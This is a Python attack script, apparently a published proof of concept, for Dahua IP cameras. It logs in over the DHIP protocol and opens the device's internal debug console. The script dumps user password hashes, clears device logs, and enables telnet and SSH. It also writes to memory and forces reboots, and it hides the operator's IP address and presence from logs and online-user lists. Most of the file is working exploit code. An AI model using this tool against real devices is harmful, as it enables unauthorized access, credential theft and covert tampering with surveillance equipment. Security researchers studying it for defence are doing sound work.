#!/usr/bin/env python2.7

"""
Author: bashis <mcw noemail eu> 2019
Subject: Dahua DHIP JSON Debug Console

[Description]
1. This script will use Dahua 'DHIP' P2P binary protocol, that works on normal HTTP/HTTPS ports and TCP/5000
2. Will attach to Dahua devices internal 'Debug Console' using JSON (same type as the former debug on TCP/6789) 

[Login]
1. Authenticated access with valid l/p
2. Any lowpriv user will have full access
3. Default l/p with 'anonymity' works when Anonymous Login is enabled

[Get password hash]
1. Cmd: 'OnvifUser -u' (MD5 hash / cleartext)
2. Cmd: 'user -u' (MD5 hash)

[shell]
1. Cmd: 'shell' starts, but no I/O to/from shell (executes '/bin/sh -c sh')

[log]
1. With this script, neither online users or login information will be logged
2. Cmd: 'log -c' will clear logs as username 'Console'
3. Cmd: 'log -a TEST' will generate 'TEST' log with username 'Console'

[Config]
1. Cmd: 'ceconfig -get Telnet' will show current 'Telnet' config
2. Cmd: 'ceconfig -set Telnet.Enable=true' will enable 'Telnet' (in my IPC, 'telnetd' will check if guid == 0, and exit with 0)
3. Cmd: 'ceconfig -get SSHD' will show current 'SSHD' config
4. Cmd: 'ceconfig -set SSHD.Enable=true' will enable 'SSHD' (in my IPC, 'sshd 'do not exist)
5. Few additional Cmd added as reference

[New Config]
1. Possible too add new non-Dahua config (create remote JSON dict and store some fun ;-)
2. Could be useful if there is service(s) available, but not started due lack of config 

[Interesting Cmd]
1. memory  -a addr     : dump 512 bytes m_szData from [addr]!
2. memory  -b addr val : write a byte [m_szData] to [addr]!
3. memory  -w addr val : write a word [m_szData] to [addr]!
4. memory -d addr val : write a double word [m_szData] to [addr]!
Note: If someone figure how to use these, I would appreciate some info...

[Bugs]
1. SSL do not work (SSL starts, but remote device returns non-SSL response when using DHIP)

[Verified]
Device Type: Dahua IPC-HDBW1320E-W
System Version: 2.400.0000000.16.R, Build Date: 2017-08-31

"""

import sys
import json
import argparse
import copy
import thread
import inspect

from OpenSSL import crypto # pip install pyopenssl
from pwn import *	# pip install pwntools

global debug
debug = False

def DEBUG(direction, packet):
	if debug:

		# Print send/recv data and current line number
		print "[BEGIN {}] <{:-^60}>".format(direction, inspect.currentframe().f_back.f_lineno)
		if packet[0:8] == p64(0x2000000044484950,endian='big'):  # DHIP
			header = packet[0:32]
			data = packet[32:]

			if header[0:8] == p64(0x2000000044484950,endian='big'): # DHIP
				print "\n-HEADER-  -DHIP-  SessionID   ID      LEN               LEN"
			print "{}|{}|{}|{}|{}|{}|{}|{}".format(
				header[0:4].encode('hex'),header[4:8].encode('hex'),header[8:12].encode('hex'),
				header[12:16].encode('hex'),header[16:20].encode('hex'),header[20:24].encode('hex'),
				header[24:28].encode('hex'),header[28:32].encode('hex'))
			if data:
				print "{}\n".format(data)
		elif packet:
				print "\n{}\n".format(packet)
		print "[ END  {}] <{:-^60}>".format(direction, inspect.currentframe().f_back.f_lineno)
	return

#
# Dahua random MD5 password hash
#
def dahua_md5_hash(Dahua_random, Dahua_realm, username, password):

	PWDDB_HASH = hashlib.md5(username + ':' + Dahua_realm + ':' + password + '').hexdigest().upper()
	PASS = ''+ username + ':' + Dahua_random + ':' + PWDDB_HASH + ''
	RANDOM_HASH = hashlib.md5(PASS).hexdigest().upper()

	return RANDOM_HASH

class Dahua_Functions:

	def __init__(self, rhost, rport, DHIP_SSL, credentials, force):
		self.rhost = rhost
		self.rport = rport
		self.DHIP_SSL = DHIP_SSL
		self.credentials = credentials
		self.force = force

		# Internal sharing
		self.header_Dahua = '' 				# P2P binary header we will work with (DHIP)
		self.ID = 0							# Our Request / Responce ID that must be in all requests and initated by us
		self.SessionID = 0					# Session ID will be returned after successful login
		self.OBJECT = 0						# Object ID will be returned after called <service>.factory.instance
		self.SID = 0						# SID will be returned after we called <service>.attach with 'Object ID'
		self.CALLBACK = ''					# 'callback' ID will be returned after we called <service>.attach with 'proc: <Number>' (callback will have same number)
		self.FakeIPaddr = '(null)'			# WebGUI: mask our real IP
#		self.FakeIPaddr = '192.168.57.1'
		self.clientType = ''				# WebGUI: We do not show up in logs or online users
#		self.clientType = 'Web3.0'
		
		self.event = threading.Event()
		self.socket_event = threading.Event()
		self.lock = threading.Lock()

	#
	# This function will check and process any late incoming packets every second
	# At same time it will act as the delay for keepAlive of the connection
	#
	def sleep_check_socket(self,delay):
		keepAlive = 0
		sleep = 1

		while True:
			if delay <= keepAlive:
				break
			else:
				keepAlive += sleep
				# If received callback data, break
				if self.remote.can_recv():
					break
				time.sleep(sleep)
				continue


	def P2P_timeout(self,threadName,delay):

		log.success("Started keepAlive thread")

		while True:
			self.sleep_check_socket(delay)
			query_args = {
				"method":"global.keepAlive",
				"magic" : "0x1234",
				"params":{
					"timeout":delay,
					"active":True
					},
				"id":self.ID,
				"session":self.SessionID}
			data, LEN = self.P2P(json.dumps(query_args))
			if not LEN:
				log.failure("keepAlive fail")
				self.event.set()
			elif LEN == 1:
				result = json.loads(data)

				if result.get('result'):
					if self.event.is_set():
						log.success("keepAlive back")
						self.event.clear()
				else:
					# check for 'method' == 'client.notifyConsoleResult' and push it to Console if found
					if not self.ConsoleResult(json.dumps(result)):
						log.failure("keepAlive fail")
						self.event.set()
			else:
				for NUM in range(0,LEN):
					result = json.loads(data[NUM])

					if result.get('result'):
						if self.event.is_set():
							log.success("keepAlive back")
							self.event.clear()
					else:
						# check for 'method' == 'client.notifyConsoleResult' and push it to Console if found
						if not self.ConsoleResult(json.dumps(result)):
							log.failure("keepAlive fail")
							self.event.set()


	def P2P(self, packet):
		P2P_header = ""
		P2P_data = ""
		P2P_return_data = []
		header_LEN = 0
		data = ''

		header = copy.copy(self.header_Dahua)
		header = string.replace(header,'_SessionHexID_',p32(self.SessionID) if self.SessionID else p32(0x0))
		header = string.replace(header,'_LEN_',p32(len(packet)))
		header = string.replace(header,'_ID_',p32(self.ID))

		self.ID += 1;

		self.lock.acquire()

		DEBUG("SEND",header + packet)

		try:
			self.remote.send(header + packet)
		except Exception as e:
			if self.lock.locked():
				self.lock.release()
			self.socket_event.set()
			log.failure(str(e))

		#
		# We must expect there is no output from remote device
		# Some debug cmd do not return any output, some will return after timeout/failure, most will return directly
		#
#		TIMEOUT = 0.5
		TIMEOUT = 1
		while True:
			try:
				tmp = len(data)
				data += self.remote.recv(numb=8192,timeout=TIMEOUT)
				if tmp == len(data):
					break
			except Exception as e:
				self.socket_event.set()
				break

		if not data:
			if self.lock.locked():
				self.lock.release()
			log.failure("No output from remote!!")
			return None, False

		while len(data):
			if data[0:8] == p64(0x2000000044484950,endian='big'):	# DHIP
				P2P_header = data[0:32]
				header_LEN = unpack(P2P_header[16:20])
				data = data[32:]
			else:
				P2P_data = data[0:header_LEN]
				if int(header_LEN):
					DEBUG("RECV",P2P_header + data[0:header_LEN])
				else:
					DEBUG("RECV",P2P_header)
				P2P_return_data.append(P2P_data)
				data = data[header_LEN:]
				if self.lock.locked():
					self.lock.release()
				if not len(data):
					break
				
		#
		# When talking to Console, we will get two JSON packets: 1) Output from the Console, 2) ACK on our request
		#
		if len(P2P_return_data) > 1:
			return P2P_return_data, len(P2P_return_data)
		else:
			return ''.join(P2P_return_data), True

	def Dahua_DHIP_Login(self):

		login = log.progress("Login")

		#                        HEADER       | D   H   I  P  | SessionID  | ID  | Packet LEN       | Packet LEN
#		self.header_Dahua =  '\x20\x00\x00\x00\x44\x48\x49\x50_SessionHexID__ID__LEN_\x00\x00\x00\x00_LEN_\x00\x00\x00\x00'
		self.header_Dahua =  p64(0x2000000044484950,endian='big') +'_SessionHexID__ID__LEN_'+ p32(0x0) +'_LEN_'+ p32(0x0) 

		USER_NAME = self.credentials.split(':')[0]
		PASSWORD = self.credentials.split(':')[1]

		self.query_args = {
			"id" : 10000,
			"magic":"0x1234",
			"method":"global.login",
			"params":{
				"clientType":self.clientType,
				"ipAddr":self.FakeIPaddr,
				"loginType":"Direct",
				"password":"",
				"userName":USER_NAME,
				},
			"session":0
			}

		data, LEN = self.P2P(json.dumps(self.query_args))
		if not LEN:
			login.failure("global.login [random]")
			return False
		result = json.loads(data)

		self.SessionID = result['session']
		RANDOM = result['params']['random']
		REALM = result['params']['realm']

		RANDOM_HASH = dahua_md5_hash(RANDOM, REALM, USER_NAME, PASSWORD)

		self.query_args = {
			"id":10000,
			"magic":"0x1234",
			"method":"global.login",
			"session":self.SessionID,
			"params":{
				"userName":USER_NAME,
				"password":RANDOM_HASH,
				"clientType":self.clientType,
				"ipAddr" : self.FakeIPaddr,	
				"loginType" : "Direct",
				"authorityType":"Default",
				},
			}

		data, LEN = self.P2P(json.dumps(self.query_args))
		if not LEN:
			return False
		responce = json.loads(data)

		if not responce.get('result'):
			login.failure("global.login: {}".format(responce['error']['message']))
			return False

		keepAlive = responce['params']['keepAliveInterval']
		thread.start_new_thread(self.P2P_timeout,("P2P_timeout", keepAlive,))

		login.success("Success")

		return True

	def CheckForConsole(self):

		query_args = {
			"method":"system.listService",
			"session":self.SessionID,
			"id":self.ID
			}

		result, LEN = self.P2P(json.dumps(query_args))
		if not LEN:
			return False

		result = json.loads(result)
		if result.get('result'):
			for count in range(0,len(result['params']['service'])):
				if result['params']['service'][count] == 'console':
					return True

		return False


	def DahuaDebugConsole(self):

		#
		# Additional Cmd list
		#
		cmd_list = {
		#
		# misc
		#
		'telnet':{
			'cmd':'self.telnetd_SSHD(msg)',
			'help':'Start / Stop (-h for params)',
			},
		'ssh':{
			'cmd':'self.telnetd_SSHD(msg)',
			'help':'Start / Stop (-h for params)',
			},
		'config':{
			'cmd':'self.config_members(msg)',
			'help':'remote config (-h for params)',
			},
		'service':{
			'cmd':'self.listService(msg)',
			'help':'List remote services and "methods" (-h for params)',
			},
		'device':{
			'cmd':'self.GetRemoteInfo(msg)',
			'help':'Dump some information of remote device',
			},
		'certificate':{
			'cmd':'self.GetRemoteInfo("certificate")',
			'help':'Dump some information of remote certificate',
			},
		'REBOOT':{
			'cmd':'self.reboot(msg)',
			'help':'Try force reboot of remote',
			},
		'test-config':{
			'cmd':'self.newConfig(msg)',
			'help':' New config test (-h for params)',
			},
		}

		try:
			self.remote = remote(self.rhost, int(self.rport),ssl=self.DHIP_SSL)
		except Exception as e:
			return False

		if not self.Dahua_DHIP_Login():
			return False

		console = log.progress("Dahua JSON Console")
		console.status("Starting")

		if not self.CheckForConsole():
			console.failure("Service Console do not exist on remote device")
			return False

		query_args = {
			"id":self.ID,
			"magic":"0x1234",
			"method":"console.factory.instance",
			"params":None, 
			"session":self.SessionID
			}
		data, LEN = self.P2P(json.dumps(query_args))
		if not LEN:
			console.failure("console.factory.instance")
			return False
		result = json.loads(data)

		#
		# If multiple Consoles is attached to one device, all attached Consoles will receive same output
		#
		self.OBJECT = result['result']

		query_args = {
			"id":self.ID,						# (signed int)	# This ID will be persistent to the 'console'
			"magic":"0x1234",
			"method":"console.attach",
			"params":{
				"object":self.OBJECT, 			# (unsigned int)
				"proc":self.SessionID,			# (unsigned int) Generates 'callback' in JSON from remote in 'console.runCmd' with same number
				},
			"object":self.OBJECT, 				# (unsigned int)
			"session":self.SessionID 			# (signed int)
			}

		data, LEN = self.P2P(json.dumps(query_args))

		if not LEN:
			console.failure("console.attach")
			return False
		result = json.loads(data)
		self.SID = result['params']['SID']

		console.success("Success")

		while True:
			if self.socket_event.is_set():
				return False
			self.prompt()
			msg = sys.stdin.readline().strip()

			cmd = msg.split()

			if msg:
				if msg == 'shell' and not self.force:
					log.failure("[shell] will execute and hang the Console/Device (DoS)")
					log.failure("If you still want to try, run this script with --force")
					continue
				elif msg == 'exit' and not self.force:
					log.failure("[exit] You really want to exit? (maybe you mean 'quit' this connection?)")
					log.failure("If you still want to try, run this script with --force")
					continue

				for command in cmd_list:
					if command == cmd[0]:
						tmp = cmd_list[command]['cmd']
						exec(tmp)
						break
				if command == cmd[0]:
					continue

				query_args = {
					"SID":self.SID,
					"id":self.ID,
					"magic":"0x1234",
					"method":"console.runCmd",
					"params":{
						"command":msg,
						},
					"session":self.SessionID
					}

				data, LEN = self.P2P(json.dumps(query_args))

				if not LEN:
					continue
				elif LEN == 1:
					self.ConsoleResult(data)
				else:
					for NUM in range(0,LEN):
						self.ConsoleResult(data[NUM])

				if msg == 'quit' or msg == 'shutdown' or msg == 'reboot':
					query_args = {
						"id":self.ID,
						"magic":"0x1234",
						"method":"console.detach",
						"params":{
							"object":self.OBJECT,
							"proc":self.SessionID,
							},
						"object":self.OBJECT,
						"session":self.SessionID
						}
					data, LEN = self.P2P(json.dumps(query_args))
					if LEN:
						data = json.loads(data)
						if not data.get('result'):
							log.failure("console.detach: {}".format(data))
						self.ConsoleResult(json.dumps(data))
					else:
						log.failure("console.detach")

					query_args = {
						"id":self.ID,
						"magic":"0x1234",
						"method":"console.destroy",
						"params":None, 
						"object":self.OBJECT,
						"session":self.SessionID
						}
					data, LEN = self.P2P(json.dumps(query_args))
					if LEN:
						data = json.loads(data)
						if not data.get('result'):
							log.failure("console.destroy: {}".format(data))
						self.ConsoleResult(json.dumps(data))
					else:
						log.failure("console.destroy")
					return self.logout()

				elif msg == 'help':
					log.info("Local cmd:")
					for command in cmd_list:
						log.success("{}: {}".format(command,cmd_list[command]['help']))


		return

	def ConsoleResult(self,data):

		#
		# Some stuff prints sometimes 'garbage', like 'dvrip -l'
		#
		data = json.loads(data.decode("utf-8","ignore"),strict=False)

		if data.get('method') == 'client.notifyConsoleResult':
			#
			# Seems not to be used for anything useful, leaving it here for future reference
			#
#			self.CALLBACK = data.get('callback')
#			log.info("callback: {}".format(self.CALLBACK))

			paramsinfo = data['params']['info']

			if not int(paramsinfo.get('Count')):
				log.failure("No output received from Console")
				return False

			for paramscount in range(0,int(paramsinfo.get('Count'))):
				print str(paramsinfo.get('Data')[paramscount]).strip('\n')
			return True

		elif not data.get('result'):
			log.failure("Invalid command: 'help' for help")
		return False

	def reboot(self,msg):
		self.msg = msg
		self.cmd = msg.split()

		query_args = {
			"method":"magicBox.reboot",
			"params": {
				"delay":0
				},
			"session":self.SessionID,
			"id":self.ID
			}
		self.P2P(json.dumps(query_args))
		self.socket_event.set()
		log.success("Trying to force reboot")


	def logout(self):

		self.query_args = {
			"method":"global.logout",
			"params":"null",
			"session":self.SessionID,
			"id":self.ID
			}
		data, LEN = self.P2P(json.dumps(self.query_args))
		if LEN:
			data = json.loads(data)
			if data.get('result'):
				return True
			else:
				log.failure("global.logout: {}".format(data))
				return False
		else:
			return False

	def prompt(self):
		PromptText = "\033[92m[\033[91mConsole\033[92m]\033[0m# "
		sys.stdout.write(PromptText)
		sys.stdout.flush()

	def config_members(self,msg):
		msg = msg
		cmd = msg.split()

		if len(cmd) == 1 or cmd[1] == '-h':
			log.info("Usage:\n{}\n{}\n{}\n{}".format(
				"members: show config members",
				"all: dump all remote config",
				"<member>: dump config for <member>",
				"Note: Use 'ceconfig' in Console to set/get",
				))
			return True

		if cmd[1] == 'members':
			query_args = {
				"method":"configManager.getMemberNames",
				"params": {
					"name":"",
					},
				"session":self.SessionID,
				"id":self.ID
				}
		else:
			if cmd[1] == 'all':
				cmd[1] = 'All'
			query_args = {
				"method":"configManager.getConfig",
				"params": {
					"name":cmd[1],
					},
				"session":self.SessionID,
				"id":self.ID
				}

		result, LEN = self.P2P(json.dumps(query_args))
		if not LEN:
			return
		if cmd[1] == 'All':
			result = ''.join(result)
		result = json.loads(result)
		result.pop('id')
		result.pop('session')
		result.pop('result')
		print json.dumps(result,indent=4)

		return


	def telnetd_SSHD(self,msg):
		cmd = msg.split()

		if cmd[0] == 'telnet':
			SERVICE = 'Telnet'
		elif cmd[0] == 'ssh':
			SERVICE = 'SSHD'

		if len(cmd) == 1 or cmd[1] == '-h':
			log.info("Usage:\n{} <1|enable or 0|disable>".format(cmd[0]))
			return False
		elif cmd[1] == 'enable' or cmd[1] == '1':
			enable = True
		elif cmd[1] == 'disable' or cmd[1] == '0':
			enable = False
		else:
			log.info("Usage:\n{} <1|enable or 0|disable>".format(cmd[0]))
			return False

		query_args = {
			"method":"configManager.getConfig",
			"params": {
				"name":SERVICE,
				},
			"session":self.SessionID,
			"id":self.ID
			}

		result, LEN = self.P2P(json.dumps(query_args))
		if not LEN:
			return
		result = json.loads(result)
		if result.get('result'):
			if result['params']['table']['Enable'] == enable:
				log.failure("{} already: {}".format(cmd[0],"Enabled" if enable else "Disabled"))
				return
		else:
			log.failure("Failure: {}".format(result))
			return

		result['method'] = "configManager.setConfig"
		result['params']['table']['Enable'] = enable
		result['params']['name'] = SERVICE
		result['id'] = self.ID
		result.pop('result')

		result, LEN  = self.P2P(json.dumps(result))
		result = json.loads(result)
		if result.get('result'):
			log.success("{}: {}".format(cmd[0],"Enabled" if enable else "Disabled"))
		else:
			log.failure("Failure: {}".format(result))
			return

	def listService(self,msg):
		msg = msg
		cmd = msg.split()

		if not len(cmd) == 1:
			if cmd[1] == '-h':
				log.info("Usage:\n{}\n{}\n{}".format(
					"<none>: dump all remote services",
					"<service>: dump methods for <service>",
					"all: dump all remote services methods (services all)"))
				return True

		query_args = {
			"method":"system.listService",
			"session":self.SessionID,
			"id":self.ID
			}

		result, LEN = self.P2P(json.dumps(query_args))
		if not LEN:
			log.failure("Failure to fetch: {}".format(cmd[1]))
			return
		result = json.loads(result)
		if result.get('result'):
			result.pop('id')
			result.pop('session')
			if len(cmd) == 1:
				log.info("Remote Services ({}):".format(len(result['params']['service'])))
			for count in range(0,len(result['params']['service'])):
				if len(cmd) == 1 or len(cmd) == 2 and cmd[1] == 'all':
					print "{}".format(result['params']['service'][count])

				if len(cmd) == 2 and cmd[1] == 'all':

					time.sleep(0.2)	# Seems to be needed...

					query_tmp = {
						"method":"",
						"session":self.SessionID,
						"id":self.ID
						}
					query_tmp.update({'method' : result['params']['service'][count] + '.listMethod'})
					result2, LEN = self.P2P(json.dumps(query_tmp))
					if not LEN:
						log.failure("Failure to fetch: {}".format(query_tmp.get('method')))
					if LEN:
						result2 = json.loads(result2)
						if result2.get('result'):
							result2.pop('result')
							result2.pop('id')
							result2.pop('session')
							print json.dumps(result2,indent=4)

				elif len(cmd) == 2 and cmd[1] == result['params']['service'][count]:
					log.success("methods for service: {}".format(cmd[1]))
					query_tmp = {
						"method":"",
						"session":self.SessionID,
						"id":self.ID
						}
					query_tmp.update({'method' : result['params']['service'][count] + '.listMethod'})
					result2, LEN = self.P2P(json.dumps(query_tmp))
					if not LEN:
						log.failure("Failure to fetch: {}".format(cmd[1]))
						return
					result2 = json.loads(result2)
					if result2.get('result'):
						result2.pop('id')
						result2.pop('session')
						print json.dumps(result2,indent=4)


			return True
		else:
			log.failure("Failure: {}".format(result))
			return False

	def GetRemoteInfo(self,msg):
		msg = msg
		cmd = msg.split()

		if cmd[0] == 'device':

			query_args = {
				"method":"magicBox.getSoftwareVersion",
				"session":self.SessionID,
				"id":self.ID
				}
			result, LEN = self.P2P(json.dumps(query_args))
			if LEN:
				result = json.loads(result)
				VERSION = result.get('params').get('version').get('Version',"(null)")

			query_args = {
				"method":"magicBox.getProductDefinition",
				"session":self.SessionID,
				"id":self.ID
				}

			result, LEN = self.P2P(json.dumps(query_args))
			if LEN:
				result = json.loads(result)

				if result.get('result'):
					result = result.get('params').get('definition')
					log.success("\033[92m[\033[91mSystem\033[92m]\033[0m\nVendor: {}, Build: {}, Version: {}\nWeb: {}, OEM: {}, Package: {}".format(
						result.get('Vendor',"(null)"),
						result.get('BuildDateTime',"(null)"),
						VERSION,
						result.get('WebVersion',"(null)"),
						result.get('OEMVersion',"(null)"),
						result.get('PackageBaseName',"(null)"),
						))

			query_args = {
				"method":"magicBox.getSystemInfo",
				"session":self.SessionID,
				"id":self.ID
				}

			result, LEN = self.P2P(json.dumps(query_args))
			if LEN:
				result = json.loads(result)

				if result.get('result'):
					result = result.get('params')
					log.success("\033[92m[\033[91mDevice\033[92m]\033[0m\nType: {}, CPU: {}, HW ver: {}, S/N: {}".format(
						result.get('deviceType',"(null)"),
						result.get('processor',"(null)"),
						result.get('hardwareVersion',"(null)"),
						result.get('serialNumber',"(null)"),
						))

			query_args = {
				"method":"magicBox.getMemoryInfo",
				"session":self.SessionID,
				"id":self.ID
				}

			result, LEN = self.P2P(json.dumps(query_args))
			if LEN:
				result = json.loads(result)

				if result.get('result'):
					result = result.get('params')
					log.success("\033[92m[\033[91mMemory\033[92m]\033[0m\nTotal: {} MB, Free: {} MB".format(
						int(result.get('total',0)) / float(float(1024) ** 2),
						int(result.get('free',0)) / float(float(1024) ** 2)
						))

			query_args = {
				"method":"storage.getDeviceAllInfo",
				"session":self.SessionID,
				"id":self.ID
				}

			result, LEN = self.P2P(json.dumps(query_args))
			if LEN:
				result = json.loads(result)

				if result.get('result'):
					NAME = result.get('params').get('info')[0].get('Name',"(null)")
					result = result.get('params').get('info')[0].get('Detail')[0]
					log.success("\033[92m[\033[91mStorage\033[92m]\033[0m\nDevice: {}, Mount: {}, Access: {}\nTotal: {} MB, Used: {} MB, Free: {} MB".format(
						NAME,
						result.get('Path',"(null)"),
						result.get('Type',"(null)"),
						int(result.get('TotalBytes',0)) / float(float(1024) ** 2),
						int(result.get('UsedBytes',0)) / float(float(1024) ** 2),
						(int(result.get('TotalBytes',0)) / float(float(1024) ** 2)) - (int(result.get('UsedBytes',0)) / float(float(1024) ** 2)),
						))


			query_args = {
				"method":"Security.getEncryptInfo",
				"session":self.SessionID,
				"id":self.ID
				}

			result, LEN = self.P2P(json.dumps(query_args))
			if LEN:
				result = json.loads(result)

				if result.get('result'):
					pub = result.get('params').get('pub').split(",")
					log.success("\033[92m[\033[91mEncrypt Info\033[92m]\033[0m\nAsymmetric: {}, Cipher(s): {}, RSA Passphrase: {}\nRSA Modulus: {}".format(
						result.get('params').get('asymmetric'),
						'; '.join(result.get('params').get('cipher')),
						pub[1].split(":")[1],
						pub[0].split(":")[1],
						))
		elif cmd[0] == 'certificate':
			query_args = {
				"method":"CertManager.exportRootCert",
				"session":self.SessionID,
				"id":self.ID
				}

			result, LEN = self.P2P(json.dumps(query_args))
			if LEN:
				result = json.loads(result)

				if result.get('result'):
					CACERT = base64.decodestring(result.get('params').get('cert'))
					x509 = crypto.load_certificate(crypto.FILETYPE_PEM, CACERT)
					issuer = x509.get_issuer()
					subject = x509.get_subject()

					log.success("\033[92m[\033[91mRoot Certificate\033[92m]\033[0m\n\033[92m[\033[91mIssuer\033[92m]\033[0m\n{}\n\033[92m[\033[91mSubject\033[92m]\033[0m\n{}\n{}".format(
						str(x509.get_issuer()).split("'")[1],
						str(x509.get_subject()).split("'")[1],
						CACERT,
						))

					log.success("\033[92m[\033[91mPublic Key\033[92m]\033[0m\n{}".format(
						crypto.dump_publickey(crypto.FILETYPE_PEM,x509.get_pubkey()),
						))

			query_args = {
				"method":"CertManager.getSvrCertInfo",
				"session":self.SessionID,
				"id":self.ID
				}

			result, LEN = self.P2P(json.dumps(query_args))
			if LEN:
				result = json.loads(result)
				result.pop('id')
				result.pop('session')
				if result.get('result'):
					log.success("\033[92m[\033[91mServer Certificate\033[92m]\033[0m\n{}".format(
						json.dumps(result,indent=4),
						))

	def newConfig(self,msg):
		msg = msg
		cmd = msg.split()

		if len(cmd) == 1:
			log.failure("Usage: show / set / get / del")
			return 

		if cmd[1] == 'set' or cmd[1] == 'show':
			query_args = {
				"method":"configManager.setConfig",
					"params": {
					"table": {
						"Config":31337,
						"Enable":False,
						"Description":"Just simple PoC",
						},
					"name":"Config_31337",
					},
				"session":self.SessionID,
				"id":self.ID
				}
			if cmd[1] == 'show':
				print json.dumps(query_args,indent=4)
				return


			log.info("query: {} ".format(query_args))

			result, LEN = self.P2P(json.dumps(query_args))
			if not LEN:
				return
			result = json.loads(result)
			print json.dumps(result,indent=4)

		elif cmd[1] == 'get':
			query_args = {
				"method":"configManager.getConfig",
				"params": {
					"name":"Config_31337",
					},
				"session":self.SessionID,
				"id":self.ID
				}

			log.info("query: {} ".format(query_args))

			result, LEN = self.P2P(json.dumps(query_args))
			if not LEN:
				return

			result = json.loads(result)
			print json.dumps(result,indent=4)

		elif cmd[1] == 'del':
			query_args = {
				"method":"configManager.deleteConfig",
				"params": {
					"name":"Config_31337",
					},
				"session":self.SessionID,
				"id":self.ID
				}

			log.info("query: {} ".format(query_args))

			result, LEN = self.P2P(json.dumps(query_args))
			if not LEN:
				return

			result = json.loads(result)
			print json.dumps(result,indent=4)

		else:
			log.failure("Usage: show / set / get / del")
			return 


#
#
# Validate correctness of HOST, IP and PORT
#
class Validate:

	# Check if IP is valid
	def CheckIP(self,IP):
		self.IP = IP

		ip = self.IP.split('.')
		if len(ip) != 4:
			return False
		for tmp in ip:
			if not tmp.isdigit():
				return False
			i = int(tmp)
			if i < 0 or i > 255:
				return False
		return True

	# Check if PORT is valid
	def Port(self,PORT):
		self.PORT = PORT

		if int(self.PORT) < 1 or int(self.PORT) > 65535:
			return False
		else:
			return True

	# Check if HOST is valid
	def Host(self,HOST):
		self.HOST = HOST

		try:
			# Check valid IP
			socket.inet_aton(self.HOST) # Will generate exeption if we try with DNS or invalid IP
			# Now we check if it is correct typed IP
			if self.CheckIP(self.HOST):
				return self.HOST
			else:
				return False
		except socket.error as e:
			# Else check valid DNS name, and use the IP address
			try:
				self.HOST = socket.gethostbyname(self.HOST)
				return self.HOST
			except socket.error as e:
				return False


if __name__ == '__main__':

#
# Help, info and pre-defined values
#	
	INFO =  '[Dahua DHIP JSON Debug Console 2019 bashis <mcw noemail eu>]\n'
	DHIP_SSL = False
	force = False
	rhost = '192.168.57.20'	# Default Remote HOST
#	rport = '5000'			# Default Remote PORT (Normally used port)
	rport = '80'			# Default Remote PORT (PoC that normal HTTP port working too)
	credentials = 'admin:admin'			# Default
#	credentials = 'anonymity:anonymity'	# Anonymous Login must be enabled for this account



#
# Try to parse all arguments
#
	try:
		arg_parser = argparse.ArgumentParser(
		prog=sys.argv[0],
				description=('[*] '+ INFO +' [*]'))
		arg_parser.add_argument('--rhost', required=False, help='Remote Target Address (IP/FQDN) [Default: '+ rhost +']')
		arg_parser.add_argument('--rport', required=False, help='Remote Target HTTP/HTTPS Port [Default: '+ rport +']')
		if credentials:
			arg_parser.add_argument('--auth', required=False, help='Basic Authentication [Default: '+ credentials + ']')
		arg_parser.add_argument('--ssl', required=False, default=False, action='store_true', help='Use SSL for remote connection [Default: no SSL]')
		arg_parser.add_argument('-d','--debug', required=False, default=False, action='store_true', help='Debug [Default: False]')
		arg_parser.add_argument('-f','--force', required=False, default=False, action='store_true', help='Force [Default: False]')
		args = arg_parser.parse_args()
	except Exception as e:
		print INFO,"\nError: {}\n".format(str(e))
		sys.exit(1)

	# We want at least one argument, so print out help
	if len(sys.argv) == 1:
		arg_parser.parse_args(['-h'])

	log.info(INFO)
#
# Check validity, update if needed, of provided options
#
	if credentials and args.auth:
		credentials = args.auth

	if args.rport:
		rport = args.rport

	if args.debug:
		debug = True

	if args.force:
		force = True

	if args.rhost:
		rhost = args.rhost

	if args.ssl:
		if not force:
			log.failure("SSL do not fully work")
			log.failure("If you still want to try, run this script with --force")
			sys.exit(-1)
		DHIP_SSL = True
		if not args.rport:
			rport = '443'

	# Check if RPORT is valid
	if not Validate().Port(rport):
		log.failure("Invalid RPORT - Choose between 1 and 65535")
		sys.exit(1)

	# Check if RHOST is valid IP or FQDN, get IP back
	rhost = Validate().Host(rhost)
	if not rhost:
		log.failure("Invalid RHOST")
		sys.exit(1)

#
# Validation done, start print out stuff to the user
#
	if args.ssl:
		log.info("DHIP SSL Mode Selected")
	log.info("RHOST: {}".format(rhost))
	log.info("RPORT: {}".format(rport))

	status = Dahua_Functions(rhost, rport, DHIP_SSL, credentials, force).DahuaDebugConsole()

	sys.exit(0)
